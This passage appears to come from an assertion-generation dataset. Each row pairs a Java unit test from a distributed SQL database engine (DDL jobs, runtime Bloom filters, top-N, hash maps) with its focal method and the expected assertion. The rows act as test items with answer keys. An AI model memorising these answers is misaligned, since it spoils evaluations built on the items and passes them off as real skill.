getReturningAffectRows(List<Map<Integer, ParameterContext>> returningResult, ExecutionContext newEc) { List<Map<Integer, ParameterContext>> orgParams = newEc.getParams().getBatchParameters();  if (returningResult.isEmpty()) { return orgParams.size(); }  // 判断 for (Map<Integer, ParameterContext> baseParam : returningResult) { final List<String> pkParams = new ArrayList<>();  for (int i = 0; i < baseParam.size(); i++) { final ParameterContext pkParam = baseParam.get(i + 1); pkParams.add( Optional.ofNullable(pkParam.getArgs()[1]).map(e -> e.toString().toLowerCase()).orElse(""NULL"")); }  throw new TddlRuntimeException(ErrorCode.ERR_GLOBAL_SECONDARY_INDEX_BACKFILL_DUPLICATE_ENTRY, String.join(""-"", pkParams), ""PRIMARY""); }  return orgParams.size(); }"	assertEquals(Loader.getReturningAffectRows(returningResult, ec), 2)
"testBackfillReturningLoader2() { ExecutionContext ec = Mockito.mock(ExecutionContext.class);  Parameters parameters = Mockito.mock(Parameters.class);  List<Map<Integer, ParameterContext>> params = new ArrayList<>(); params.add(new HashMap<>()); params.add(new HashMap<>());  when(parameters.getBatchParameters()).thenReturn(params);  when(ec.getParams()).thenReturn(parameters);  List<Map<Integer, ParameterContext>> returningResult = new ArrayList<>(); Map<Integer, ParameterContext> res = new HashMap<>(); ParameterContext pc = Mockito.mock(ParameterContext.class); res.put(1, pc); returningResult.add(res);  Object[] objects = new Object[2]; objects[0] = 1; objects[1] = ""wumu"";  when(pc.getArgs()).thenReturn(objects);  try { Loader.getReturningAffectRows(returningResult, ec); } catch (TddlRuntimeException e) { Assert.""<AssertPlaceHolder>""; return; }  Assert.fail(); }
getReturningAffectRows(List<Map<Integer, ParameterContext>> returningResult, ExecutionContext newEc) { List<Map<Integer, ParameterContext>> orgParams = newEc.getParams().getBatchParameters();  if (returningResult.isEmpty()) { return orgParams.size(); }  // 判断 for (Map<Integer, ParameterContext> baseParam : returningResult) { final List<String> pkParams = new ArrayList<>();  for (int i = 0; i < baseParam.size(); i++) { final ParameterContext pkParam = baseParam.get(i + 1); pkParams.add( Optional.ofNullable(pkParam.getArgs()[1]).map(e -> e.toString().toLowerCase()).orElse(""NULL"")); }  throw new TddlRuntimeException(ErrorCode.ERR_GLOBAL_SECONDARY_INDEX_BACKFILL_DUPLICATE_ENTRY, String.join(""-"", pkParams), ""PRIMARY""); }  return orgParams.size(); }"	"assertTrue(e.getMessage().contains(""Duplicated entry 'wumu' for key 'PRIMARY'""))"
"testExecute() { DdlJob ddlJob = Mockito.mock(DdlJob.class); ExecutionContext ec = Mockito.mock(ExecutionContext.class); DdlContext ddlContext = Mockito.mock(DdlContext.class);  Mockito.when(ddlContext.getSchemaName()).thenReturn(""information_schema"");  DdlEngineRequester requester = new DdlEngineRequester(ddlJob, ec, ddlContext);  try { requester.execute(); } catch (Exception e) { Assert.""<AssertPlaceHolder>""; } }
execute() { if (StringUtils.equalsIgnoreCase(ddlContext.getSchemaName(), INFORMATION_SCHEMA)) { throw DdlHelper.logAndThrowError(LOGGER, ""The DDL job can not be executed under the database 'information_schema'""); }  ddlContext.setResources(ddlJob.getExcludeResources());  // Create a new job and put it in the queue. ddlJobManager.storeJob(ddlJob, ddlContext);  // Request the leader to perform the job. DdlRequest ddlRequest = notifyLeader(ddlContext.getSchemaName(), Lists.newArrayList(ddlContext.getJobId()));  // Wait for response from the leader, then respond to the client. if (ddlContext.isAsyncMode()) { return; } respond(ddlRequest, ddlJobManager, executionContext, true, false, ddlContext.isEnableTrace()); }"	"assertTrue(e.getMessage().contains(""The DDL job can not be executed""))"
"testRemoveJob_withoutSubJobs() { List<DdlEngineRecord> records = new ArrayList<>(); records.add(mock(DdlEngineRecord.class)); when(engineTaskAccessor.deleteByJobId(anyLong())).thenReturn(1); DdlEngineRecord ddlEngineRecord = mock(DdlEngineRecord.class); ddlEngineRecord.state = DdlState.COMPLETED.name(); when(engineAccessor.query(anyLong())).thenReturn(ddlEngineRecord); when(engineAccessor.delete(anyLong())).thenReturn(1);  DdlJobManager manager = new DdlJobManager(); DdlJobManager spyManager = Mockito.spy(manager); doCallRealMethod().when(spyManager).removeJob(anyLong());  List<SubJobTask> emptyList = new ArrayList<>(); Mockito.doReturn(emptyList).when(spyManager) .fetchSubJobsRecursive(anyLong(), any(DdlEngineTaskAccessor.class), anyBoolean()); Mockito.doNothing().when(spyManager).validateDdlStateContains(any(), any());  Assert.""<AssertPlaceHolder>""; verify(engineTaskAccessor, times(1)).deleteByJobId(1L); verify(engineAccessor, times(1)).query(1L); verify(spyManager, times(1)).fetchSubJobsRecursive(anyLong(), any(DdlEngineTaskAccessor.class), anyBoolean()); verify(engineAccessor, times(1)).delete(1L); }
removeJob(long jobId) { // Execute the following operations within a transaction. List<Long> jobIds = new DdlEngineAccessorDelegate<List<Long>>() {  @Override protected List<Long> invoke() { List<Long> jobList = new ArrayList<>();  // remove subjob cascade List<SubJobTask> subjobs = fetchSubJobsRecursive(jobId, engineTaskAccessor, false); for (SubJobTask subjob : GeneralUtil.emptyIfNull(subjobs)) { for (long subJobId : subjob.fetchAllSubJobs()) { jobList.add(subJobId); } }  jobList.add(jobId);  return jobList; } }.execute();  jobIds.forEach(o -> { new DdlEngineAccessorDelegate<Boolean>() {  @Override protected Boolean invoke() {  DdlEngineRecord jobRecord = engineAccessor.query(o); validateDdlStateContains(DdlState.valueOf(jobRecord.state), DdlState.FINISHED); int count = engineAccessor.delete(o); engineTaskAccessor.deleteByJobId(o);  if (o == jobId) { getResourceManager().releaseResource(getConnection(), o); } DdlEngineStats.METRIC_DDL_JOBS_FINISHED.update(count);  return count > 0; } }.execute(); }); return true; }"	assertEquals(true, spyManager.removeJob(1L))
"testRemoveJob_withSubJobs() { List<DdlEngineRecord> records = new ArrayList<>(); records.add(mock(DdlEngineRecord.class)); when(engineTaskAccessor.deleteByJobId(anyLong())).thenReturn(1); DdlEngineRecord ddlEngineRecord = mock(DdlEngineRecord.class); ddlEngineRecord.state = DdlState.COMPLETED.name(); when(engineAccessor.query(anyLong())).thenReturn(ddlEngineRecord); when(engineAccessor.delete(anyLong())).thenReturn(1);  DdlJobManager manager = new DdlJobManager(); DdlJobManager spyManager = Mockito.spy(manager); doCallRealMethod().when(spyManager).removeJob(anyLong());  List<SubJobTask> subJobTasks = new ArrayList<>(); SubJobTask subJobTask = new SubJobTask("""", """", 10, """", 101); subJobTasks.add(subJobTask); subJobTask = new SubJobTask("""", """", 11, """", 111); subJobTasks.add(subJobTask); Mockito.doReturn(subJobTasks).when(spyManager) .fetchSubJobsRecursive(anyLong(), any(DdlEngineTaskAccessor.class), anyBoolean()); Mockito.doNothing().when(spyManager).validateDdlStateContains(any(), any());  Assert.""<AssertPlaceHolder>""; verify(engineTaskAccessor, times(5)).deleteByJobId(anyLong()); verify(engineAccessor, times(1)).query(1L); verify(spyManager, times(1)).fetchSubJobsRecursive(anyLong(), any(DdlEngineTaskAccessor.class), anyBoolean()); verify(engineAccessor, times(5)).delete(anyLong()); }
removeJob(long jobId) { // Execute the following operations within a transaction. List<Long> jobIds = new DdlEngineAccessorDelegate<List<Long>>() {  @Override protected List<Long> invoke() { List<Long> jobList = new ArrayList<>();  // remove subjob cascade List<SubJobTask> subjobs = fetchSubJobsRecursive(jobId, engineTaskAccessor, false); for (SubJobTask subjob : GeneralUtil.emptyIfNull(subjobs)) { for (long subJobId : subjob.fetchAllSubJobs()) { jobList.add(subJobId); } }  jobList.add(jobId);  return jobList; } }.execute();  jobIds.forEach(o -> { new DdlEngineAccessorDelegate<Boolean>() {  @Override protected Boolean invoke() {  DdlEngineRecord jobRecord = engineAccessor.query(o); validateDdlStateContains(DdlState.valueOf(jobRecord.state), DdlState.FINISHED); int count = engineAccessor.delete(o); engineTaskAccessor.deleteByJobId(o);  if (o == jobId) { getResourceManager().releaseResource(getConnection(), o); } DdlEngineStats.METRIC_DDL_JOBS_FINISHED.update(count);  return count > 0; } }.execute(); }); return true; }"	assertEquals(true, spyManager.removeJob(1L))
"testBuildDdlJobWithIfNotExistsAndExists() { when(logicalCreateFileStorage.getCreateFileStorage()).thenReturn(createFileStorage); when(createFileStorage.getEngineName()).thenReturn(""OSS""); when(createFileStorage.isIfNotExists()).thenReturn(true);  // Here, we assume the FileSystemManager returns a present optional indicating the storage already exists. DdlJob ddlJob = handler.buildDdlJob(logicalCreateFileStorage, executionContext); ""<AssertPlaceHolder>""; }
buildDdlJob(BaseDdlOperation logicalDdlPlan, ExecutionContext executionContext) { LogicalCreateFileStorage logicalCreateFileStorage = (LogicalCreateFileStorage) logicalDdlPlan; CreateFileStorage createFileStorage = logicalCreateFileStorage.getCreateFileStorage();  Engine engine = Engine.of(createFileStorage.getEngineName()); if (engine == null || !Engine.isFileStore(engine)) { throw new TddlRuntimeException(ErrorCode.ERR_NOT_SUPPORT, ""invalid engine : "" + createFileStorage.getEngineName()); }  if (createFileStorage.isIfNotExists()) { try { if (FileSystemManager.getInstance().getCache().get(engine).isPresent()) { return new TransientDdlJob(); } } catch (ExecutionException e) { //ignore } }  // check fileStorageInfoKey Map<FileStorageInfoKey, String> with = new HashMap<>(); Map<FileStorageInfoKey.AzureConnectionStringKey, String> azureSettings = null; for (Map.Entry<String, String> e : createFileStorage.getWith().entrySet()) { String key = e.getKey(); String value = e.getValue(); FileStorageInfoKey fileStorageInfoKey; if ((fileStorageInfoKey = FileStorageInfoKey.of(key)) == null) { throw new TddlRuntimeException(ErrorCode.ERR_EXECUTE_ON_OSS, ""error key: "" + key); } with.put(fileStorageInfoKey, value); if (fileStorageInfoKey == FileStorageInfoKey.AZURE_CONNECTION_STRING) { azureSettings = parseConnectionString(value); } }  return new CreateFileStorageJobFactory(engine, with, azureSettings, executionContext).create(); }"	assertTrue(ddlJob instanceof TransientDdlJob)
"testBroadcastRF() { OperatorStatistics operatorStatistics = new OperatorStatistics();  // Initialize FragmentRFManager int totalPartitionCount = PARTITION_COUNT; int totalWorkerCount = 4; double defaultFpp = 0.1d; int rowUpperBound = 100000; int rowLowerBound = 4096; double filterRatioThreshold = 0.25d; int rfSampleCount = 10; FragmentRFManager manager = new SimpleFragmentRFManager( totalPartitionCount, 1, defaultFpp, rowUpperBound, rowLowerBound, filterRatioThreshold, rfSampleCount );  // create FragmentRFItemKey String buildColumnName = ""build_col_1""; String probeColumnName = ""probe_col_1""; int buildIndex = 0; int probeIndex = 0; FragmentRFItemKey itemKey = new FragmentRFItemKey(buildColumnName, probeColumnName, buildIndex, probeIndex);  // Initialize a new FragmentRFItem. boolean useXXHashInBuild = true; boolean useXXHashInFilter = true; FragmentRFManager.RFType rfType = FragmentRFManager.RFType.BROADCAST; FragmentRFItem item = new FragmentRFItemImpl( manager, buildColumnName, probeColumnName, useXXHashInBuild, useXXHashInFilter, rfType );  // Set parsed parameters about channel. int buildSideChannel = 0; int sourceFilterChannel = 0; int sourceRefInFile = 0; item.setBuildSideChannel(buildSideChannel); item.setSourceFilterChannel(sourceFilterChannel); item.setSourceRefInFile(sourceRefInFile);  // assign runtime filters RFBloomFilter bloomFilter = new BlockLongBloomFilter(TOTAL_ROW_COUNT); for (int i = 0; i < TOTAL_ROW_COUNT; i++) { if (i % 3 == 0) { bloomFilter.putLong(i); } } RFBloomFilter[] bloomFilters = new RFBloomFilter[] {bloomFilter}; item.assignRF(bloomFilters); manager.addItem(itemKey, item);  Map<FragmentRFItemKey, RFBloomFilter[]> rfBloomFilterMap = new HashMap<>(); rfBloomFilterMap.put(itemKey, bloomFilters);  RFLazyEvaluator evaluator = new RFLazyEvaluator(manager, operatorStatistics, rfBloomFilterMap);  for (int i = 0; i < TOTAL_ROW_COUNT / CHUNK_LIMIT; i++) {  // 0 ~ 1000 // 1000 ~ 2000 // ... long[] values = new long[CHUNK_LIMIT]; for (int j = 0; j < CHUNK_LIMIT; j++) { values[j] = i * CHUNK_LIMIT + j; }  LongBlock block = new LongBlock(0, CHUNK_LIMIT, null, values); Chunk chunk = new Chunk(block); int startPos = i * CHUNK_LIMIT; int positionCount = CHUNK_LIMIT;  // empty RoaringBitmap deletion = new RoaringBitmap(); boolean[] bitmap = new boolean[CHUNK_LIMIT];  // evaluate and check the filter ratio. int selectionCount = evaluator.eval(chunk, startPos, positionCount, deletion, bitmap); Assert.""<AssertPlaceHolder>""; }  }
eval(Chunk chunk, int startPosition, int positionCount, RoaringBitmap deletion, boolean[] bitmap) { long cardinality = deletion.rangeCardinality(startPosition, startPosition + positionCount); Preconditions.checkArgument(cardinality <= positionCount);  if (cardinality != 0) { // mark the position as TRUE that not deleted in the RoaringBitmap. for (int i = 0; i < positionCount; i++) { bitmap[i] = !deletion.contains(i + startPosition); } } else { // clear bitmap Arrays.fill(bitmap, 0, chunk.getPositionCount(), true); } // clear bitmap in the area that out of bound. if (chunk.getPositionCount() < bitmap.length) { Arrays.fill(bitmap, chunk.getPositionCount(), bitmap.length, false); }  if (chunk == null || chunk.getPositionCount() == 0) { return 0; }  final int totalPartitionCount = manager.getTotalPartitionCount(); int selectedCount = chunk.getPositionCount(); for (int i = 0; i < itemSize; i++) { FragmentRFItem item = items[i]; int filterChannel = item.getSourceFilterChannel(); boolean useXXHashInFilter = item.useXXHashInFilter();  FragmentRFItemKey itemKey = itemKeys[i]; RFBloomFilter[] rfBloomFilters = rfBloomFilterMap.get(itemKey);  // We have not received the runtime filter of this item key from build side. if (rfBloomFilters == null) { continue; }  // check runtime filter efficiency. if (!efficiencyChecker.check(itemKey)) { continue; }  final int originalCount = selectedCount; switch (item.getRFType()) { case BROADCAST: { selectedCount = chunk.getBlock(filterChannel).mightContainsLong(rfBloomFilters[0], bitmap, true); break; } case LOCAL: { if (useXXHashInFilter) { selectedCount = chunk.getBlock(filterChannel).mightContainsLong(totalPartitionCount, rfBloomFilters, bitmap, true, true); } else { selectedCount = chunk.getBlock(filterChannel).mightContainsInt(totalPartitionCount, rfBloomFilters, bitmap, false, true); } break; } }  // sample the filter ratio of runtime filter. efficiencyChecker.sample(itemKey, originalCount, selectedCount); }  // statistics for filtered rows by runtime filter. operatorStatistics.addRuntimeFilteredCount(chunk.getPositionCount() - selectedCount);  return selectedCount; }"	"assertTrue(""selectionCount = "" + selectionCount + "" lowerBound = "" + CHUNK_LIMIT / 3 + "" upperBound = "" + CHUNK_LIMIT / 3.0d * (1 + 0.1d), selectionCount >= CHUNK_LIMIT / 3 && selectionCount <= CHUNK_LIMIT / 3.0d * (1 + 0.1d))"
"testLocalRF() { OperatorStatistics operatorStatistics = new OperatorStatistics();  // Initialize FragmentRFManager int totalPartitionCount = PARTITION_COUNT; int totalWorkerCount = 4; double defaultFpp = 0.1d; int rowUpperBound = 100000; int rowLowerBound = 4096; double filterRatioThreshold = 0.25d; int rfSampleCount = 10; FragmentRFManager manager = new SimpleFragmentRFManager( totalPartitionCount, 1, defaultFpp, rowUpperBound, rowLowerBound, filterRatioThreshold, rfSampleCount );  // For global RF // create FragmentRFItemKey FragmentRFItemKey itemKey = new FragmentRFItemKey( ""build_col_1"", ""probe_col_1"", 0, 0);  // Initialize a new local FragmentRFItem. FragmentRFManager.RFType rfType = FragmentRFManager.RFType.LOCAL; boolean useXXHashInBuild = true; boolean useXXHashInFilter = true; FragmentRFItem item = new FragmentRFItemImpl( manager, ""build_col_1"", ""probe_col_1"", useXXHashInBuild, useXXHashInFilter, rfType );  // Set parsed parameters about channel. int buildSideChannel = 0; int sourceFilterChannel = 0; int sourceRefInFile = 0; item.setBuildSideChannel(buildSideChannel); item.setSourceFilterChannel(sourceFilterChannel); item.setSourceRefInFile(sourceRefInFile);  // assign runtime filters RFBloomFilter[] bloomFilters = new RFBloomFilter[PARTITION_COUNT]; for (int i = 0; i < bloomFilters.length; i++) { bloomFilters[i] = new BlockLongBloomFilter(TOTAL_ROW_COUNT / PARTITION_COUNT); }  for (int i = 0; i < TOTAL_ROW_COUNT; i++) { // Reserve values that are integer multiples of 3. if (i % 3 == 0) { // Route to partition long hashVal = XxhashUtils.finalShuffle(i); int partition = (int) ((hashVal & Long.MAX_VALUE) % PARTITION_COUNT);  bloomFilters[partition].putLong(i); } } item.assignRF(bloomFilters);  manager.addItem(itemKey, item);  Map<FragmentRFItemKey, RFBloomFilter[]> rfBloomFilterMap = new HashMap<>(); rfBloomFilterMap.put(itemKey, bloomFilters);  RFLazyEvaluator evaluator = new RFLazyEvaluator(manager, operatorStatistics, rfBloomFilterMap);  Map<Integer, List<Chunk>> partitionChunks = new HashMap<>(); Map<Integer, BlockBuilder> partitionBlockBuilders = new HashMap<>(); for (int part = 0; part < PARTITION_COUNT; part++) { partitionBlockBuilders.put(part, new LongBlockBuilder(4)); }  for (int i = 0; i < TOTAL_ROW_COUNT; i++) { // Reserve values that are integer multiples of 3. if (i % 3 == 0) { // Route to partition long hashVal = XxhashUtils.finalShuffle(i); int partition = (int) ((hashVal & Long.MAX_VALUE) % PARTITION_COUNT);  // write block builder BlockBuilder partitionBlockBuilder = partitionBlockBuilders.get(partition); partitionBlockBuilder.writeLong(i);  // write chunks. if (partitionBlockBuilder.getPositionCount() >= CHUNK_LIMIT) { List<Chunk> chunks = partitionChunks.computeIfAbsent(partition, any -> new ArrayList<>()); Block block = partitionBlockBuilder.build(); chunks.add(new Chunk(block));  partitionBlockBuilders.put(partition, new LongBlockBuilder(4)); } } }  // flush block builder for (int part = 0; part < PARTITION_COUNT; part++) { BlockBuilder partitionBlockBuilder = partitionBlockBuilders.get(part); if (partitionBlockBuilder.getPositionCount() > 0) { List<Chunk> chunks = partitionChunks.computeIfAbsent(part, any -> new ArrayList<>()); Block block = partitionBlockBuilder.build(); chunks.add(new Chunk(block)); } }  // For all chunks in all part, the hit rate is 100% for (int part = 0; part < PARTITION_COUNT; part++) { List<Chunk> chunks = partitionChunks.get(part); for (Chunk chunk : chunks) { int startPos = 0; final int positionCount = chunk.getPositionCount(); // empty RoaringBitmap deletion = new RoaringBitmap(); boolean[] bitmap = new boolean[positionCount];  // evaluate and check the filter ratio. int selectionCount = evaluator.eval(chunk, startPos, positionCount, deletion, bitmap); Assert.""<AssertPlaceHolder>""; } }  }
eval(Chunk chunk, int startPosition, int positionCount, RoaringBitmap deletion, boolean[] bitmap) { long cardinality = deletion.rangeCardinality(startPosition, startPosition + positionCount); Preconditions.checkArgument(cardinality <= positionCount);  if (cardinality != 0) { // mark the position as TRUE that not deleted in the RoaringBitmap. for (int i = 0; i < positionCount; i++) { bitmap[i] = !deletion.contains(i + startPosition); } } else { // clear bitmap Arrays.fill(bitmap, 0, chunk.getPositionCount(), true); } // clear bitmap in the area that out of bound. if (chunk.getPositionCount() < bitmap.length) { Arrays.fill(bitmap, chunk.getPositionCount(), bitmap.length, false); }  if (chunk == null || chunk.getPositionCount() == 0) { return 0; }  final int totalPartitionCount = manager.getTotalPartitionCount(); int selectedCount = chunk.getPositionCount(); for (int i = 0; i < itemSize; i++) { FragmentRFItem item = items[i]; int filterChannel = item.getSourceFilterChannel(); boolean useXXHashInFilter = item.useXXHashInFilter();  FragmentRFItemKey itemKey = itemKeys[i]; RFBloomFilter[] rfBloomFilters = rfBloomFilterMap.get(itemKey);  // We have not received the runtime filter of this item key from build side. if (rfBloomFilters == null) { continue; }  // check runtime filter efficiency. if (!efficiencyChecker.check(itemKey)) { continue; }  final int originalCount = selectedCount; switch (item.getRFType()) { case BROADCAST: { selectedCount = chunk.getBlock(filterChannel).mightContainsLong(rfBloomFilters[0], bitmap, true); break; } case LOCAL: { if (useXXHashInFilter) { selectedCount = chunk.getBlock(filterChannel).mightContainsLong(totalPartitionCount, rfBloomFilters, bitmap, true, true); } else { selectedCount = chunk.getBlock(filterChannel).mightContainsInt(totalPartitionCount, rfBloomFilters, bitmap, false, true); } break; } }  // sample the filter ratio of runtime filter. efficiencyChecker.sample(itemKey, originalCount, selectedCount); }  // statistics for filtered rows by runtime filter. operatorStatistics.addRuntimeFilteredCount(chunk.getPositionCount() - selectedCount);  return selectedCount; }"	assertTrue(selectionCount >= positionCount)
"testTopN3() { int limit = 2033; List<OrderByOption> orderbys = getOrderBys(ImmutableList.of(0), ImmutableList.of(RelFieldCollation.Direction.ASCENDING)); RowChunksBuilder inputBuilder = rowChunksBuilder(DataTypes.StringType, DataTypes.DoubleType) .addSequenceChunk(1024, 10000, 10000) .addSequenceChunk(1024, -300, -300) .addSequenceChunk(1024, 22000, 13000) .addSequenceChunk(1024, 30000, 14000) .addSequenceChunk(1024, 40000, 15000) .addSequenceChunk(200, 70, 70) .addSequenceChunk(1024, 50000, 16000) .addSequenceChunk(1024, 60000, 17000) .addSequenceChunk(1024, 70000, 18000) .addSequenceChunk(10240, 80000, 19000);  Executor input = inputBuilder.buildExec(); SpilledTopNExec topNExec1 = new SpilledTopNExec(input.getDataTypes(), orderbys, limit, context, spillerFactory); execForMppMode(topNExec1, input, 5, true, new Callable() { @Override public Object call() throws Exception { Assert.""<AssertPlaceHolder>""; return null; } }); }
getMemoryAllocatorCtx() { return memoryAllocator; }"	assertEquals(0, topNExec1.getMemoryAllocatorCtx().getAllAllocated())
"InterruptedException { ChunksIndex chunksIndex = new ChunksIndex(); for (int chunkId = 0; chunkId < CHUNK_COUNT; chunkId++) { IntegerBlockBuilder builder = new IntegerBlockBuilder(CHUNK_SIZE); for (int position = 0; position < CHUNK_SIZE; position++) { builder.writeInt(chunkId * CHUNK_SIZE + position); } Block block = builder.build(); Chunk chunk = new Chunk(block); chunksIndex.addChunk(chunk); }  ChunkRowOpenHashMap hashMap = new ChunkRowOpenHashMap(chunksIndex);  IntFunction<Runnable> taskBuilder = startPosition -> () -> { for (int i = startPosition; i < TOTAL_ROWS; i += NUM_THREADS) { hashMap.put(i, chunksIndex.hashCode(i)); } };  Thread[] threads = new Thread[NUM_THREADS]; for (int i = 0; i < NUM_THREADS; i++) { threads[i] = new Thread(taskBuilder.apply(i)); threads[i].start(); }  for (int i = 0; i < NUM_THREADS; i++) { threads[i].join(); }  for (int value = 0; value < TOTAL_ROWS; value++) { ""<AssertPlaceHolder>""; } }
get(Chunk chunk, int position) { final AtomicIntegerArray keys = this.keys; int h = HashCommon.mix(chunk.hashCode(position)) & mask; int k = keys.get(h);  if (k == NOT_EXISTS) { return NOT_EXISTS; } else if (chunks.equals(k, chunk, position)) { return k; }  // Open-address probing. Note that there is always an unused entry while (true) { if ((k = keys.get(h = (h + 1) & mask)) == NOT_EXISTS) { return NOT_EXISTS; } else if (chunks.equals(k, chunk, position)) { return k; } } }"	assertEquals(value, hashMap.get(new Chunk(IntegerBlock.of(value)), 0))
"Exception {  Runnable producer = () -> { try { for (int i = 0; i < 1000; i++) { queue.put(1); } } catch (InterruptedException e) { System.out.println(Thread.currentThread().getName() + "": interrupted""); } finally { queue.putEnd(); } };  Thread[] threads = new Thread[NUM_THREADS]; for (int i = 0; i < NUM_THREADS; i++) { threads[i] = new Thread(producer); threads[i].start(); }  int sum = 0; int finished = NUM_THREADS; while (finished > 0) { Integer element = queue.take(); if (element == END) { finished--; } else { sum += element; } }  for (int i = 0; i < NUM_THREADS; i++) { threads[i].join(); }  ""<AssertPlaceHolder>""; }
take() throws InterruptedException { E element = buffer.take(); if (element != endMarker) { semaphore.release(); } return element; }"	assertEquals(sum, 1000 * NUM_THREADS)
"test1() { MockArrayCursor cursor = new MockArrayCursor(""table1""); cursor.addColumn(""id"", DataTypes.IntegerType); cursor.addColumn(""name"", DataTypes.StringType); cursor.addColumn(""school"", DataTypes.StringType); cursor.initMeta();  cursor.addRow(new Object[] {1, ""name1"", ""school1""}); cursor.addRow(new Object[] {2, ""name2"", ""school2""}); cursor.addRow(new Object[] {3, ""name3"", ""school3""}); cursor.addRow(new Object[] {4, ""name4"", ""school4""}); cursor.addRow(new Object[] {5, ""name5"", ""school5""}); cursor.addRow(new Object[] {6, ""name6"", ""school6""}); cursor.addRow(new Object[] {7, ""name7"", ""school7""});  cursor.init();  Row row = null; int count = 0; while ((row = cursor.next()) != null) { System.out.println(row); count++;  }  Assert.""<AssertPlaceHolder>""; }
initMeta() { this.meta = CursorMeta.build(columns); }"	assertEquals(7, count)
"test() { // extract(year from col_date)  final int positionCount = context.getExecutorChunkLimit(); final int nullCount = 20; final int lowerBound = 0; // 1970-01-01 final int upperBound = 365 * 50; // days final SqlOperator operator = TddlOperatorTable.EXTRACT;  List<DataType<?>> inputTypes = ImmutableList.of(DataTypes.DateType);  RexNode root = REX_BUILDER.makeCall( TYPE_FACTORY.createSqlType(SqlTypeName.BIGINT), operator, ImmutableList.of( REX_BUILDER.makeLiteral(""YEAR""), REX_BUILDER.makeInputRef(TYPE_FACTORY.createSqlType(SqlTypeName.DATE), 0) ));  InputRefTypeChecker inputRefTypeChecker = new InputRefTypeChecker(inputTypes); root = root.accept(inputRefTypeChecker);  Rex2VectorizedExpressionVisitor converter = new Rex2VectorizedExpressionVisitor(context, inputTypes.size());  VectorizedExpression expression = root.accept(converter);  MutableChunk preAllocatedChunk = MutableChunk.newBuilder(positionCount) .addEmptySlots(inputTypes) .addEmptySlots(converter.getOutputDataTypes()) .build();  // build input decimal block DateBlock inputBlock = generateDateBlock(positionCount, nullCount, lowerBound, upperBound); Chunk inputChunk = new Chunk(positionCount, inputBlock);  LongBlock outputBlock = (LongBlock) BlockUtils.createBlock(DataTypes.LongType, inputChunk.getPositionCount());  preAllocatedChunk.setSelection(null); preAllocatedChunk.setSelectionInUse(false); preAllocatedChunk.setSlotAt(inputBlock, 0); preAllocatedChunk.setSlotAt(outputBlock, expression.getOutputIndex()); preAllocatedChunk.setBatchSize(positionCount);  EvaluationContext evaluationContext = new EvaluationContext(preAllocatedChunk, context); expression.eval(evaluationContext);  for (int i = 0; i < inputChunk.getPositionCount(); i++) { Object actual = outputBlock.getObject(i); Object expected = inputBlock.isNull(i) ? null : ((OriginalDate) inputBlock.getDate(i)).getMysqlDateTime().getYear();  Assert.""<AssertPlaceHolder>""; } }
eval(EvaluationContext ctx) { evalChildren(ctx); MutableChunk chunk = ctx.getPreAllocatedChunk(); int batchSize = chunk.batchSize(); boolean isSelectionInUse = chunk.isSelectionInUse(); int[] sel = chunk.selection();  // output block RandomAccessBlock outputVectorSlot = chunk.slotIn(outputIndex, outputDataType); long[] output = (outputVectorSlot.cast(LongBlock.class)).longArray();  // date block RandomAccessBlock inputVectorSlot = chunk.slotIn(children[1].getOutputIndex(), children[1].getOutputDataType());  // when the interval unit is null boolean[] outputNulls = outputVectorSlot.nulls(); if (isConstOperandNull) { outputVectorSlot.setHasNull(true); for (int i = 0; i < batchSize; i++) { outputNulls[i] = true; } return; }  // handle nulls VectorizedExpressionUtils.mergeNulls(chunk, outputIndex, children[1].getOutputIndex());  if (inputVectorSlot instanceof DateBlock) { long[] packedLongs = inputVectorSlot.cast(DateBlock.class).getPacked();  switch (intervalType) { case INTERVAL_YEAR: { // for year if (isSelectionInUse) { for (int i = 0; i < batchSize; i++) { int j = sel[i]; long l = packedLongs[j]; output[j] = (l >> 46) / 13; } } else { for (int i = 0; i < batchSize; i++) { long l = packedLongs[i]; output[i] = (l >> 46) / 13; } } } break; case INTERVAL_MONTH: { // for month if (isSelectionInUse) { for (int i = 0; i < batchSize; i++) { int j = sel[i]; long l = packedLongs[j]; output[j] = (l >> 46) % 13; } } else { for (int i = 0; i < batchSize; i++) { long l = packedLongs[i]; output[i] = (l >> 46) % 13; } } } break; case INTERVAL_DAY: { // for day final long modulo = 1L << 5; if (isSelectionInUse) { for (int i = 0; i < batchSize; i++) { int j = sel[i]; long l = packedLongs[j]; output[j] = (l >> 41) % modulo; } } else { for (int i = 0; i < batchSize; i++) { long l = packedLongs[i]; output[i] = (l >> 41) % modulo; } } } break; default: // for other interval type, use non-vectorized method. boolean isDate = MySQLIntervalType.isDate(intervalType);  // normal processing for datetime value. MysqlDateTime scratchValue = new MysqlDateTime(); for (int i = 0; i < batchSize; i++) { int j = isSelectionInUse ? sel[i] : i;  // parse date value long packedLong = packedLongs[j]; TimeStorage.readDate(packedLong, scratchValue);  // parse interval by sign and mysql datetime value. int sign = isDate ? 1 : (scratchValue.isNeg() ? -1 : 1); long result = doParseInterval(scratchValue, sign); output[j] = result; } } } else if (inputVectorSlot instanceof ReferenceBlock) { // for other interval type, use non-vectorized method. boolean isDate = MySQLIntervalType.isDate(intervalType);  // normal processing for datetime value. for (int i = 0; i < batchSize; i++) { int j = isSelectionInUse ? sel[i] : i;  // parse date value Object timeObj = inputVectorSlot.elementAt(j); MysqlDateTime t; int sign; if (isDate) { t = DataTypeUtil.toMySQLDatetimeByFlags(timeObj, Types.TIMESTAMP, TimeParserFlags.FLAG_TIME_FUZZY_DATE); if (t == null) { outputNulls[j] = true; continue; } sign = 1; } else { t = DataTypeUtil.toMySQLDatetime(timeObj, Types.TIME); if (t == null) { outputNulls[j] = true; continue; } sign = t.isNeg() ? -1 : 1; }  // parse interval by sign and mysql datetime value. long result = doParseInterval(t, sign); output[j] = result; } }  }"	assertEquals(expected, actual)
"testGetBool() { Properties properties = new Properties(); properties.setProperty(ConnectionProperties.ALERT_STATISTIC_INTERRUPT, ""true""); try (MockedStatic<MetaDbInstConfigManager> mockedStaticMetaDbInstConfigManager = mockStatic(MetaDbInstConfigManager.class)) { MetaDbInstConfigManager metaDbInstConfigManager = mock(MetaDbInstConfigManager.class); when(metaDbInstConfigManager.getCnVariableConfigMap()).thenReturn(properties); mockedStaticMetaDbInstConfigManager.when(MetaDbInstConfigManager::getInstance) .thenReturn(metaDbInstConfigManager); Assert.""<AssertPlaceHolder>""; } }
getValBool(String name) { String val = MetaDbInstConfigManager.getInstance().getCnVariableConfigMap().getProperty(name); if (val == null) { return false; } return Boolean.valueOf(val).booleanValue(); }"	assertTrue(InstConfUtil.getValBool(ConnectionProperties.ALERT_STATISTIC_INTERRUPT))
